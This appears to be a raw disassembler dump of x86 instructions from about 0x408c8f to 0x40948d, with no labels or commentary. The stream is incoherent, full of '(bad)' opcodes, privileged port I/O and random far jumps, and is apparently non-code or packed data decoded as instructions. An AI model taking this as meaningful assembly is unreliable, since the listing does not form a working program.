  408c8f:	test   BYTE PTR [ebx-0x29],bh
  408c92:	mov    bh,0x61
  408c94:	mov    ch,BYTE PTR [ebx+0x7b]
  408c97:	dec    esp
  408c98:	dec    esp
  408c99:	push   0x94fea542
  408c9e:	push   ds
  408c9f:	and    DWORD PTR [ecx+0x77],0x356088ff
  408ca6:	repz data16 and BYTE PTR [eax],bh
  408caa:	lea    edx,[ebp+0x24ddbe42]
  408cb0:	mov    DWORD PTR [ebp+ebp*1+0x32],esi
  408cb4:	and    bh,BYTE PTR [ebx]
  408cb6:	sub    cl,BYTE PTR [eax+0x6a]
  408cb9:	add    al,0xaa
  408cbb:	clc    
  408cbc:	push   esi
  408cbd:	shl    ch,1
  408cbf:	mov    ch,0xe6
  408cc1:	xchg   edx,eax
  408cc2:	mov    dh,0x3a
  408cc4:	cdq    
  408cc5:	mov    cs,WORD PTR [eax-0xfc7a853]
  408ccb:	xchg   DWORD PTR ds:0x135e73b3,eax
  408cd1:	or     edx,edi
  408cd3:	leave  
  408cd4:	push   edi
  408cd5:	push   0x33
  408cd7:	aas    
  408cd8:	pop    esp
  408cd9:	mov    dl,0x11
  408cdb:	xchg   esp,ebp
  408cdd:	push   edx
  408cde:	(bad)  
  408cdf:	(bad)  
  408ce1:	pop    ds
  408ce2:	aad    0x57
  408ce4:	inc    ebp
  408ce5:	mov    bl,0x98
  408ce7:	test   dh,dh
  408ce9:	push   esp
  408cea:	repz std 
  408cec:	lahf   
  408ced:	mov    edi,DWORD PTR [ebx-0x43009103]
  408cf3:	or     BYTE PTR [ecx+0x3f235d6e],0xb1
  408cfa:	push   esi
  408cfb:	add    DWORD PTR [esp+ebp*4],eax
  408cfe:	mov    dh,0xb6
  408d00:	call   0xe9b0:0xc465c6df
  408d07:	mov    eax,ds:0xefe44601
  408d0c:	xchg   esi,eax
  408d0d:	jb     0x408d0d
  408d0f:	push   esp
  408d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d11:	jb     0x408cd9
  408d13:	and    ch,bh
  408d15:	in     eax,0x21
  408d17:	std    
  408d18:	aam    0x9
  408d1a:	sbb    BYTE PTR [ebx],ch
  408d1c:	rcr    BYTE PTR [ebx+0x68],1
  408d1f:	and    al,0x87
  408d21:	test   eax,0xf4d407a5
  408d26:	pop    edx
  408d27:	addr16 jb 0x408d9f
  408d2a:	and    eax,edi
  408d2c:	test   DWORD PTR [edi-0x30185314],ecx
  408d32:	(bad)  
  408d33:	cli    
  408d34:	outs   dx,BYTE PTR ds:[esi]
  408d35:	xchg   ebp,eax
  408d36:	dec    eax
  408d37:	stos   BYTE PTR es:[edi],al
  408d38:	scas   eax,DWORD PTR es:[edi]
  408d39:	les    eax,FWORD PTR [edi+0x7f]
  408d3c:	arpl   WORD PTR [edi+0x64],sp
  408d3f:	lds    edx,FWORD PTR [edx]
  408d41:	pop    edi
  408d42:	ss add al,0x87
  408d45:	pop    esp
  408d46:	hlt    
  408d47:	daa    
  408d48:	jo     0x408d3c
  408d4a:	fld    TBYTE PTR [edi-0x1b1f210]
  408d50:	xchg   edi,eax
  408d51:	test   BYTE PTR [ecx+0x62],cl
  408d54:	and    DWORD PTR [edi-0x39],0x3e
  408d58:	and    cl,BYTE PTR [edx+0x55ab7c7e]
  408d5e:	js     0x408d95
  408d60:	rol    esi,cl
  408d62:	outs   dx,BYTE PTR ds:[esi]
  408d63:	mov    BYTE PTR [edx+0x65eac85f],dh
  408d69:	ret    0xb56c
  408d6c:	mov    al,0xbe
  408d6e:	inc    esp
  408d6f:	out    0x7d,eax
  408d71:	addr16 lods eax,DWORD PTR ds:[si]
  408d74:	push   0xffffffaa
  408d76:	jb     0x408db0
  408d78:	jle    0x408db8
  408d7a:	or     esi,ebp
  408d7c:	rcr    BYTE PTR [ebp-0x11c680d3],1
  408d82:	or     dh,ch
  408d84:	ins    BYTE PTR es:[edi],dx
  408d85:	mov    cl,dh
  408d87:	mov    ebx,0xcbea448c
  408d8d:	mov    eax,ds:0xb47c95ec
  408d92:	mov    ch,0xdd
  408d94:	ret    
  408d95:	xchg   esp,eax
  408d96:	(bad)  
  408d97:	jmp    0x23d8a670
  408d9c:	in     al,0x76
  408d9e:	mov    dl,0xa1
  408da0:	retf   
  408da1:	pop    esi
  408da2:	fisttp QWORD PTR [edx]
  408da4:	pop    ss
  408da5:	sub    BYTE PTR [ebx],bl
  408da7:	cli    
  408da8:	mov    eax,0xbae10a51
  408dad:	push   cs
  408dae:	jo     0x408dbf
  408db0:	jge    0x408d6d
  408db2:	mov    bl,BYTE PTR [eax]
  408db4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db6:	out    0x79,eax
  408db8:	adc    ecx,esi
  408dba:	xchg   edi,eax
  408dbb:	mov    edx,0x9b728fb7
  408dc0:	adc    BYTE PTR [ecx-0x66a8fb7e],bl
  408dc6:	ins    BYTE PTR es:[edi],dx
  408dc7:	popa   
  408dc8:	xor    DWORD PTR [ecx-0x13],esi
  408dcb:	ret    0xbf5c
  408dce:	cld    
  408dcf:	clc    
  408dd0:	dec    edx
  408dd1:	les    esi,FWORD PTR [edx-0x731d5925]
  408dd7:	add    DWORD PTR [edx-0x38],ebx
  408dda:	das    
  408ddb:	jecxz  0x408d6f
  408ddd:	sbb    bl,BYTE PTR [ecx-0x5814bb57]
  408de3:	mov    al,ds:0x1eb4a5f9
  408de8:	ja     0x408da7
  408dea:	cs retf 0x207a
  408dee:	nop
  408def:	ins    BYTE PTR es:[edi],dx
  408df0:	lods   eax,DWORD PTR ds:[esi]
  408df1:	jmp    0xcd1f0c48
  408df6:	in     al,dx
  408df7:	xchg   ebx,eax
  408df8:	inc    ch
  408dfa:	hlt    
  408dfb:	test   al,0x67
  408dfd:	or     eax,0x74454800
  408e02:	jmp    0xac74:0x40160e08
  408e09:	mov    WORD PTR [esi+ecx*2],cs
  408e0c:	adc    al,0x15
  408e0e:	test   eax,0x72bbe105
  408e13:	jecxz  0x408e24
  408e15:	push   edi
  408e16:	or     BYTE PTR [ecx],bl
  408e18:	js     0x408e81
  408e1a:	mov    DWORD PTR [ebp+0x50984805],ebx
  408e20:	xor    eax,0xf3cab531
  408e25:	clc    
  408e26:	or     ah,BYTE PTR [ecx+0x9]
  408e29:	xchg   edx,eax
  408e2a:	adc    DWORD PTR [ebx-0x762f06e3],ecx
  408e30:	jbe    0x408e3c
  408e32:	test   BYTE PTR [ebp+0x292bb0c2],bh
  408e38:	mov    fs:0xa38b0da4,al
  408e3e:	dec    esp
  408e3f:	push   ebx
  408e40:	ins    BYTE PTR es:[edi],dx
  408e41:	jo     0x408e2d
  408e43:	sbb    BYTE PTR [eax],dh
  408e45:	and    bh,BYTE PTR [ebp+0x461ee421]
  408e4b:	fsubr  DWORD PTR [ecx+ebx*4]
  408e4e:	out    0x5f,al
  408e50:	mov    DWORD PTR [ebx+0x7d],ecx
  408e53:	mov    al,ds:0x37c8b30d
  408e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e59:	or     al,0xeb
  408e5b:	aas    
  408e5c:	push   0x5587e349
  408e61:	data16 aad 0xe7
  408e64:	and    DWORD PTR [edi-0x4fb55e4e],ecx
  408e6a:	shl    ebx,cl
  408e6c:	in     al,0x61
  408e6e:	icebp  
  408e6f:	int    0xc4
  408e71:	pop    esp
  408e72:	xchg   BYTE PTR [ebx-0x54a21ae],bh
  408e78:	sub    eax,0x6a44ef97
  408e7d:	imul   edi,DWORD PTR [ebx-0x18],0xd27bc98a
  408e84:	fsub   QWORD PTR [ebx+0x62]
  408e87:	iret   
  408e88:	(bad)
  408e8d:	jbe    0x408e2f
  408e8f:	push   cs
  408e90:	int3   
  408e91:	test   DWORD PTR [edi+0x67f88cd6],eax
  408e97:	ja     0x408e4a
  408e99:	jbe    0x408ee0
  408e9b:	fwait
  408e9c:	and    DWORD PTR [ecx],0x8cf431d8
  408ea2:	scas   eax,DWORD PTR es:[edi]
  408ea3:	fdiv   QWORD PTR [edi]
  408ea5:	fidiv  WORD PTR ds:[edi-0x7acb857e]
  408eac:	pop    edi
  408ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eae:	inc    ecx
  408eaf:	xor    eax,0x5858c15d
  408eb4:	dec    ecx
  408eb5:	loop   0x408ecc
  408eb7:	add    ecx,edx
  408eb9:	rol    ebp,0x2d
  408ebc:	dec    esp
  408ebd:	xchg   BYTE PTR [ebp+0x5b367cb7],al
  408ec3:	push   cs
  408ec4:	adc    eax,0x64680450
  408ec9:	repz clc 
  408ecb:	mov    ds:0x23a1018,eax
  408ed0:	jno    0x408e57
  408ed2:	rol    BYTE PTR [eax+0x1fdd9189],1
  408ed8:	inc    esp
  408ed9:	jae    0x408e81
  408edb:	mov    ah,0x2d
  408edd:	and    esi,DWORD PTR [ebx]
  408edf:	dec    esp
  408ee0:	cmp    BYTE PTR [eax-0x6ad2a5e9],al
  408ee6:	xchg   esi,eax
  408ee7:	ret    
  408ee8:	fs dec eax
  408eea:	push   0xc
  408eec:	add    ebp,DWORD PTR [esi+edx*2+0x2ec73c5d]
  408ef3:	push   0x225d2928
  408ef8:	lods   al,BYTE PTR ds:[esi]
  408ef9:	adc    ah,BYTE PTR [ebp-0x69df5e7c]
  408eff:	mov    BYTE PTR [ebx+0x15230f5b],dh
  408f05:	fwait
  408f06:	push   edx
  408f07:	sub    al,0xcd
  408f09:	clc    
  408f0a:	retf   
  408f0b:	dec    edi
  408f0c:	add    BYTE PTR [esi],dl
  408f0e:	test   ah,bh
  408f10:	sbb    edi,DWORD PTR [eax+0x1144a2b8]
  408f16:	out    0xfb,eax
  408f18:	inc    edi
  408f19:	fmul   QWORD PTR [ebp-0x12]
  408f1c:	and    ch,BYTE PTR [ecx+0x30]
  408f1f:	mov    bl,0x6d
  408f21:	sub    bh,dl
  408f23:	jmp    0xe35a7288
  408f28:	dec    bx
  408f2a:	mov    ds:0xbfd1a60a,al
  408f2f:	(bad)  
  408f30:	lock inc esi
  408f32:	mov    DWORD PTR ds:0x2a7a5e9f,eax
  408f38:	daa    
  408f39:	ficomp WORD PTR [esi]
  408f3b:	mov    BYTE PTR [ebx+0x75],ah
  408f3e:	jns    0x408f87
  408f40:	mov    ds:0x185f2768,al
  408f45:	sar    esp,cl
  408f47:	add    BYTE PTR [eax],bh
  408f49:	mov    esp,0xc6efd089
  408f4e:	jo     0x408fc9
  408f50:	scas   eax,DWORD PTR es:[edi]
  408f51:	add    eax,0xaac2cdc7
  408f56:	retf   
  408f57:	cmp    al,0x45
  408f59:	aaa    
  408f5a:	pushf  
  408f5b:	(bad)  
  408f5c:	repz mov esp,0xb2a3d4c7
  408f62:	cmp    DWORD PTR [esi],eax
  408f64:	ficom  WORD PTR [esi+0x67e9d313]
  408f6a:	mov    ebp,0xf992dee9
  408f6f:	mov    bh,0xa2
  408f71:	test   al,0x3d
  408f73:	push   ebp
  408f74:	mov    al,0xa1
  408f76:	enter  0xeae7,0xa7
  408f7a:	xchg   ebx,eax
  408f7b:	mov    dh,0x83
  408f7d:	pushf  
  408f7e:	cmp    eax,0xd9afc42f
  408f83:	mov    WORD PTR [edi-0x64731285],cs
  408f89:	mov    esp,0x9c6bb539
  408f8e:	pop    edx
  408f8f:	fimul  WORD PTR [ebp-0x5e55ad44]
  408f95:	and    ah,BYTE PTR [ebx-0x3f8966d6]
  408f9b:	fstp   QWORD PTR [eax+eax*8+0x3afadc02]
  408fa2:	jns    0x408f4a
  408fa4:	fwait
  408fa5:	cmp    DWORD PTR [esi-0x63],ebx
  408fa8:	or     edi,DWORD PTR [ebx+0x57]
  408fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fac:	sbb    al,0x25
  408fae:	sub    ecx,DWORD PTR [esi]
  408fb0:	or     esp,DWORD PTR [esi+0x7ff8362a]
  408fb6:	mov    eax,DWORD PTR [ebx]
  408fb8:	pop    ss
  408fb9:	in     eax,dx
  408fba:	mov    al,0xb4
  408fbc:	adc    BYTE PTR [ebx],0x6e
  408fbf:	loopne 0x408fd9
  408fc1:	das    
  408fc2:	out    dx,eax
  408fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fc4:	loopne 0x408f51
  408fc6:	pop    ebx
  408fc7:	(bad)  
  408fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fc9:	jns    0x408fe8
  408fcb:	js     0x408f6f
  408fcd:	test   DWORD PTR [edi-0x2c12893f],esi
  408fd3:	scas   eax,DWORD PTR es:[edi]
  408fd4:	xlat   BYTE PTR ds:[ebx]
  408fd5:	loopne 0x409032
  408fd7:	mov    WORD PTR ds:[esi+0x44729fd1],gs
  408fde:	gs jmp 0x79be5a55
  408fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe5:	cld    
  408fe6:	sbb    BYTE PTR [ebx-0x29],ah
  408fe9:	cmp    al,ah
  408feb:	xor    eax,0xf33c47d5
  408ff0:	cmc    
  408ff1:	popf   
  408ff2:	jmp    0x408f77
  408ff4:	mov    edi,0xf1a05808
  408ff9:	cli    
  408ffa:	xchg   ecx,eax
  408ffb:	mov    eax,ds:0x9f0c287a
  409000:	pop    esp
  409001:	inc    ecx
  409002:	mov    al,ds:0x852c76dd
  409007:	fdiv   QWORD PTR [esi+0x3b0e185c]
  40900d:	fldcw  WORD PTR [ebp+0x73c9f0bc]
  409013:	arpl   bx,ax
  409015:	repz mov edi,0x6e876e0e
  40901b:	and    eax,0x41544072
  409020:	adc    edi,0x2f25afd8
  409026:	in     eax,dx
  409027:	(bad)  
  409028:	int3   
  409029:	bound  ecx,QWORD PTR [edi+0x15]
  40902c:	and    bh,cl
  40902e:	dec    ebx
  40902f:	adc    al,0x1f
  409031:	mov    BYTE PTR [edi+0x679976e4],dh
  409037:	lock cli 
  409039:	inc    edx
  40903a:	dec    eax
  40903b:	jp     0x409090
  40903d:	sbb    al,0xb8
  40903f:	jbe    0x409084
  409041:	and    dl,BYTE PTR [ebx+0x3c034c31]
  409047:	push   edi
  409048:	cmp    DWORD PTR [ebp+0x2cf29653],ebx
  40904e:	out    0xe3,al
  409050:	dec    eax
  409051:	daa    
  409052:	xchg   ecx,eax
  409053:	cmp    esi,DWORD PTR [ebp-0x2b3045e3]
  409059:	adc    DWORD PTR [edx-0xcf0b939],edx
  40905f:	push   esp
  409060:	clc    
  409061:	and    ebx,DWORD PTR ds:0x22105eda
  409067:	cwde   
  409068:	xor    DWORD PTR [eax-0x3b],ecx
  40906b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40906c:	js     0x409047
  40906e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  409070:	jo     0x409030
  409072:	mov    ecx,DWORD PTR [edx+eax*8+0x2c361ac5]
  409079:	xchg   edx,eax
  40907a:	sti    
  40907b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40907c:	xor    ebp,ecx
  40907e:	mov    bl,0x35
  409080:	xor    DWORD PTR [ebx-0x5a],edx
  409083:	mov    esi,0xc080c8d8
  409088:	jmp    0x69e40b1d
  40908d:	pop    ecx
  40908e:	mov    es:0x708fde99,al
  409094:	push   edx
  409095:	sti    
  409096:	jno    0x4090a0
  409098:	push   ebp
  409099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40909a:	adc    eax,0x1e039bc4
  40909f:	sbb    al,0xd7
  4090a1:	les    ecx,FWORD PTR [edx+edi*8+0x6b]
  4090a5:	jno    0x40904f
  4090a7:	sub    ah,al
  4090a9:	loopne 0x4090ff
  4090ab:	jmp    0x4090fc
  4090ad:	aas    
  4090ae:	fistp  DWORD PTR [edi]
  4090b0:	push   DWORD PTR [edx+0x1671e4b7]
  4090b6:	int3   
  4090b7:	sahf   
  4090b8:	xchg   edi,eax
  4090b9:	or     BYTE PTR [ebx],0xa2
  4090bc:	hlt    
  4090bd:	jns    0x4090a8
  4090bf:	sbb    edx,DWORD PTR [eax]
  4090c1:	jecxz  0x4090ba
  4090c3:	and    ebp,DWORD PTR [edi]
  4090c5:	aam    0xe1
  4090c7:	mov    edx,0xf930b6fb
  4090cc:	clc    
  4090cd:	push   0xffffff95
  4090cf:	pop    esp
  4090d0:	imul   ecx,DWORD PTR [edx+0x37f3133d],0xf
  4090d7:	pop    edi
  4090d8:	fdivr  DWORD PTR [ebx+0x3]
  4090db:	repnz ds jmp 0x9906:0x37aaeaf3
  4090e4:	push   es
  4090e5:	retf   
  4090e6:	enter  0xa295,0x1d
  4090ea:	xchg   ebp,esp
  4090ec:	jle    0x4090e8
  4090ee:	mov    bl,0x8d
  4090f0:	(bad)  
  4090f1:	int    0x24
  4090f3:	shr    BYTE PTR [edi],0x71
  4090f6:	sar    ebx,1
  4090f8:	in     eax,dx
  4090f9:	hlt    
  4090fa:	(bad)  
  4090fb:	bound  ebx,QWORD PTR [ebx+0x355da7cf]
  409101:	inc    BYTE PTR [ebx+0x5b222bbb]
  409107:	dec    edx
  409108:	gs inc esp
  40910a:	sar    DWORD PTR [eax+ecx*2],cl
  40910d:	mov    BYTE PTR [edi+0x1e96c20d],dl
  409113:	inc    esp
  409114:	jbe    0x409130
  409116:	push   eax
  409117:	mov    ebp,0x4f54bbf2
  40911c:	jp     0x4090d4
  40911e:	ds or  dl,ah
  409121:	sub    dh,BYTE PTR [ebx+0x7ccdbcc5]
  409127:	out    0x39,eax
  409129:	add    ch,BYTE PTR [ebp+0x7a702241]
  40912f:	or     esp,DWORD PTR [ecx+0x1dc05d11]
  409135:	mov    ebp,0x6fe00f2e
  40913a:	jns    0x409191
  40913c:	dec    ecx
  40913d:	popf   
  40913e:	je     0x40919e
  409140:	scas   eax,DWORD PTR es:[edi]
  409141:	push   ss
  409142:	sbb    esp,DWORD PTR [edx+edi*4-0x23]
  409146:	into   
  409147:	stc    
  409148:	retf   0xc104
  40914b:	sbb    al,0x2f
  40914d:	xchg   DWORD PTR [eax+0x29],ecx
  409150:	cmp    DWORD PTR [edx+0x30bc70b3],ecx
  409156:	pop    edi
  409157:	mov    eax,ds:0xb3e997ba
  40915c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40915d:	int3   
  40915e:	es and ah,dl
  409161:	scas   eax,DWORD PTR es:[edi]
  409162:	xor    al,0x23
  409164:	mov    WORD PTR ds:0xee662633,cs
  40916a:	not    BYTE PTR [ecx-0x2aac03ce]
  409170:	enter  0x6490,0xfe
  409174:	in     eax,0x2d
  409176:	xchg   edi,eax
  409177:	xor    BYTE PTR [ecx+edi*4+0x32fd0d68],ah
  40917e:	push   0x68096d82
  409183:	sbb    BYTE PTR [ebx+eax*4-0x60],bh
  409187:	mov    ch,BYTE PTR [edi-0x830ee6e]
  40918d:	xchg   ecx,eax
  40918e:	mov    ebp,0xbae009e2
  409193:	add    bl,BYTE PTR fs:[ebp-0x2e68bd68]
  40919a:	movhlps xmm3,xmm6
  40919d:	arpl   WORD PTR ds:0x4ed54fb1,ax
  4091a3:	fwait
  4091a4:	and    al,0xf
  4091a6:	fwait
  4091a7:	or     DWORD PTR [edx-0x1a316fe4],0x47
  4091ae:	adc    DWORD PTR [ecx-0x41],ebx
  4091b1:	cwde   
  4091b2:	cmp    eax,0xa8d04045
  4091b7:	add    al,0x28
  4091b9:	mov    ecx,0xd3fb3f12
  4091be:	push   es
  4091bf:	cwde   
  4091c0:	retf   
  4091c1:	adc    esi,ebx
  4091c3:	mov    esp,0xa42e86c5
  4091c8:	push   ebp
  4091c9:	jo     0x40916b
  4091cb:	out    dx,eax
  4091cc:	cli    
  4091cd:	sub    bh,BYTE PTR [ebx-0x5f]
  4091d0:	les    edx,FWORD PTR [ecx-0x550be847]
  4091d6:	ja     0x409194
  4091d8:	sub    dl,BYTE PTR [eax]
  4091da:	ror    DWORD PTR [ebp-0x1aaa9ec2],0x52
  4091e1:	mov    ds:0xd64ec383,eax
  4091e6:	(bad)  
  4091e7:	ja     0x409208
  4091e9:	das    
  4091ea:	test   esi,0x1c95cbb7
  4091f0:	ror    edi,cl
  4091f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f3:	js     0x4091de
  4091f5:	add    eax,0x62d04241
  4091fa:	mov    eax,ds:0xc249c8eb
  4091ff:	inc    edi
  409200:	ss push esp
  409202:	sti    
  409203:	cdq    
  409204:	inc    eax
  409205:	(bad)  
  409206:	and    esp,DWORD PTR [edx]
  409208:	pop    esp
  409209:	scas   al,BYTE PTR es:[edi]
  40920a:	ret    0x43a
  40920d:	adc    BYTE PTR [edx],dh
  40920f:	aas    
  409210:	xor    DWORD PTR [ecx-0x30],0x9e865722
  409217:	sub    al,0x52
  409219:	xor    DWORD PTR [ebx*1+0x232bf9a1],esp
  409220:	sub    al,0x41
  409222:	mov    ?,WORD PTR [edx+0x33]
  409225:	aas    
  409226:	mov    al,ds:0xe216ecc
  40922b:	or     eax,DWORD PTR [edi]
  40922d:	cmp    al,0xd2
  40922f:	pop    ds
  409230:	cdq    
  409231:	sti    
  409232:	add    eax,0x5a625719
  409237:	mov    ds:0xe6a2e8,al
  40923c:	mov    BYTE PTR [esi+0x16ee4f4a],ch
  409242:	bound  ebp,QWORD PTR [eax]
  409244:	mov    al,ds:0xdea55972
  409249:	ret    
  40924a:	jmp    0x409237
  40924c:	push   ds
  40924d:	dec    esp
  40924e:	and    eax,0xadd472f7
  409253:	es pop edx
  409255:	out    dx,eax
  409256:	push   edi
  409257:	cwde   
  409258:	dec    DWORD PTR [ebx+0x72]
  40925b:	pop    edx
  40925c:	aam    0x12
  40925e:	in     al,dx
  40925f:	inc    eax
  409260:	into   
  409261:	add    cl,BYTE PTR [edx-0x30]
  409264:	dec    esp
  409265:	loopne 0x4092b5
  409267:	mov    ecx,0x36a25859
  40926c:	jne    0x409288
  40926e:	jmp    0xb5e98e41
  409273:	mov    cl,0x6a
  409275:	pop    edi
  409276:	aaa    
  409277:	dec    edx
  409278:	or     ecx,DWORD PTR [eax+0x70]
  40927b:	sbb    BYTE PTR [esi+0x26],dh
  40927e:	fcmovnbe st,st(4)
  409280:	mov    esi,0xb8f803da
  409285:	sub    ah,dl
  409287:	loopne 0x409216
  409289:	mov    al,ds:0x9c8e0701
  40928e:	and    eax,0x42c0177d
  409293:	cli    
  409294:	xchg   esp,eax
  409295:	mov    ecx,0xb35efb23
  40929a:	mul    ah
  40929c:	shl    DWORD PTR [esp+ebx*4-0x60828f4f],1
  4092a3:	shl    esp,1
  4092a5:	and    DWORD PTR [ebp+0x48c84278],0xce07ccc
  4092af:	xchg   ecx,eax
  4092b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b1:	js     0x4092e5
  4092b3:	inc    esi
  4092b4:	add    BYTE PTR [edi+ebp*1],0xb3
  4092b8:	mov    eax,0xcb8afba9
  4092bd:	inc    ebp
  4092be:	fdivr  QWORD PTR [edi-0xf]
  4092c1:	add    BYTE PTR [edi-0x2250cb11],dh
  4092c7:	mov    ah,0x73
  4092c9:	mov    eax,0x31dc9129
  4092ce:	cmp    esp,DWORD PTR [eax+0x586a1b22]
  4092d4:	mov    ah,0xe2
  4092d6:	cdq    
  4092d7:	add    eax,0x318e24ed
  4092dc:	push   esi
  4092dd:	aaa    
  4092de:	clc    
  4092df:	in     al,0xf7
  4092e1:	mov    ebp,0xfa506e2a
  4092e6:	cli    
  4092e7:	sub    BYTE PTR [ecx+0x78],0x5c
  4092eb:	xchg   ecx,eax
  4092ec:	rol    DWORD PTR ds:0xd7c8c79,1
  4092f2:	aaa    
  4092f3:	jne    0x4092b6
  4092f5:	jle    0x40935c
  4092f7:	mov    ebx,0xc3f8c838
  4092fc:	cli    
  4092fd:	lods   eax,DWORD PTR ds:[esi]
  4092fe:	pop    eax
  4092ff:	fucomp st(2)
  409301:	sahf   
  409302:	(bad)  
  409303:	or     al,0xcb
  409305:	adc    al,0x48
  409307:	out    dx,eax
  409308:	ins    DWORD PTR es:[edi],dx
  409309:	mov    ebp,ebp
  40930b:	mov    esp,0x27de8b33
  409310:	jmp    0x4092d7
  409312:	sbb    al,0x96
  409314:	dec    edx
  409315:	aas    
  409316:	add    edi,DWORD PTR [esi+0x1f]
  409319:	xchg   ebx,eax
  40931a:	outs   dx,DWORD PTR ds:[esi]
  40931b:	jge    0x409304
  40931d:	and    DWORD PTR [ebx+ebx*2],esi
  409320:	mov    al,ds:0x3d1c6d68
  409325:	add    bl,0xe
  409328:	fdiv   DWORD PTR [eax]
  40932a:	sub    al,0x84
  40932c:	retf   
  40932d:	xchg   esi,eax
  40932e:	adc    BYTE PTR [ecx],ah
  409330:	arpl   WORD PTR [ebx],sp
  409332:	mov    ebx,DWORD PTR [ecx+0x12]
  409335:	adc    eax,0xee07cb3c
  40933a:	xor    ecx,DWORD PTR [edi+0x51]
  40933d:	dec    esi
  40933e:	push   esi
  40933f:	sar    BYTE PTR [eax+edx*1],0xbe
  409343:	iret   
  409344:	mov    esi,0x791ab93a
  409349:	rcr    DWORD PTR [edi+0x16],0xdf
  40934d:	outs   dx,BYTE PTR ds:[esi]
  40934e:	mov    ebp,0x6928c325
  409353:	jno    0x4093c0
  409355:	test   ax,0xef05
  409359:	and    BYTE PTR [ebx+0x75],al
  40935c:	sbb    DWORD PTR [eax+0x19],ecx
  40935f:	push   0x1f
  409361:	mov    edx,DWORD PTR ss:[ebx]
  409364:	jp     0x40930b
  409366:	mov    edi,0xa8f2903a
  40936b:	mov    eax,ds:0x1cfb77c8
  409370:	mov    ds:0x82b70407,eax
  409375:	mov    eax,edx
  409377:	mov    cl,0x73
  409379:	repnz xchg esp,eax
  40937b:	shr    dh,1
  40937d:	mov    edx,DWORD PTR [esi]
  40937f:	stos   DWORD PTR es:[edi],eax
  409380:	fwait
  409381:	jmp    0xd1a9788
  409386:	lahf   
  409387:	sbb    cl,dl
  409389:	push   0xb
  40938b:	pop    edi
  40938c:	fwait
  40938d:	jbe    0x40933e
  40938f:	xchg   esi,eax
  409390:	in     eax,0x85
  409392:	(bad)  
  409393:	(bad)  
  409394:	jbe    0x4093dd
  409396:	pop    ds
  409397:	xchg   BYTE PTR [edx-0x6d],dh
  40939a:	jne    0x409397
  40939c:	mov    eax,0x10b671b0
  4093a1:	sub    DWORD PTR [edx-0x51],0xaa09d259
  4093a8:	mov    eax,esi
  4093aa:	mov    ebx,fs
  4093ac:	add    al,BYTE PTR [ebx]
  4093ae:	mov    ecx,0x2946528e
  4093b3:	lea    ecx,[ebp+edi*2-0x7f]
  4093b7:	pop    ecx
  4093b8:	shr    eax,cl
  4093ba:	mov    WORD PTR [eax+ebx*2-0xa2a321d],es
  4093c1:	es out dx,eax
  4093c3:	mov    DWORD PTR [ebx],eax
  4093c5:	jmp    0x9783:0xabfb86
  4093cc:	pop    ecx
  4093cd:	add    ch,al
  4093cf:	or     BYTE PTR [edx-0x3a],ah
  4093d2:	lock adc eax,0xadc6deda
  4093d8:	dec    eax
  4093d9:	sti    
  4093da:	inc    ebp
  4093db:	xlat   BYTE PTR ds:[ebx]
  4093dc:	stos   DWORD PTR es:[edi],eax
  4093dd:	mov    ebp,DWORD PTR [edi+0x40]
  4093e0:	sub    bh,ch
  4093e2:	mov    ebp,0x68087966
  4093e7:	fisttp DWORD PTR [edi-0x24]
  4093ea:	xor    ah,cl
  4093ec:	lock ret 0xb7e2
  4093f0:	pop    ebx
  4093f1:	mov    eax,ecx
  4093f3:	in     eax,dx
  4093f4:	push   esp
  4093f5:	stos   BYTE PTR es:[edi],al
  4093f6:	imul   esi,ecx,0xa05eb9cc
  4093fc:	adc    al,0x93
  4093fe:	inc    edi
  4093ff:	(bad)  
  409400:	jp     0x4093f6
  409402:	inc    edi
  409403:	ds jnp 0x4093ba
  409406:	cmp    eax,0x3c9a0dce
  40940b:	sbb    eax,edi
  40940d:	jnp    0x4093a9
  40940f:	fnstcw WORD PTR [edx]
  409411:	popf   
  409412:	jno    0x40943a
  409414:	sahf   
  409415:	push   0x181e9e0d
  40941a:	xchg   ebp,eax
  40941b:	rcl    DWORD PTR ds:0x61c892f3,1
  409421:	(bad)  
  409422:	or     esi,DWORD PTR [esi-0x4]
  409425:	mov    esp,0xb90a7c24
  40942a:	lods   eax,DWORD PTR ds:[esi]
  40942b:	out    dx,eax
  40942c:	push   ecx
  40942d:	cmp    BYTE PTR [esi+0x72],0x95
  409431:	popf   
  409432:	inc    edx
  409433:	mov    dh,0x8b
  409435:	test   DWORD PTR [ebp-0x748021d8],esi
  40943b:	jnp    0x409458
  40943d:	xor    bh,BYTE PTR [ebx+0x22]
  409440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409441:	mov    ch,0x9b
  409443:	dec    edi
  409444:	push   esp
  409445:	push   edi
  409446:	sub    al,0xfa
  409448:	ficom  WORD PTR [esi+0x68482ddd]
  40944e:	call   0x45bc:0xa4d9a1f3
  409455:	inc    edx
  409456:	bound  esp,QWORD PTR [esi+0x436a0be]
  40945c:	xchg   ecx,eax
  40945d:	mov    bl,0xfd
  40945f:	mov    ecx,?
  409461:	pop    esp
  409462:	mov    ecx,0x7069b60e
  409467:	cmp    esp,DWORD PTR [edi+0x5e920f4e]
  40946d:	or     al,0xab
  40946f:	(bad)  
  409470:	cs adc al,0x44
  409473:	pop    edi
  409474:	push   0xffffffbc
  409476:	popf   
  409477:	cwde   
  409478:	sbb    eax,0x102bb23
  40947d:	push   ebp
  40947e:	and    ebp,esi
  409480:	out    0x2,al
  409482:	ins    BYTE PTR es:[edi],dx
  409483:	out    dx,al
  409484:	pushf  
  409485:	aam    0xe3
  409487:	ffree  st(1)
  409489:	outs   dx,DWORD PTR ds:[esi]
  40948a:	xor    DWORD PTR [ebx],eax
  40948c:	push   es
  40948d:	loope  0x40950b
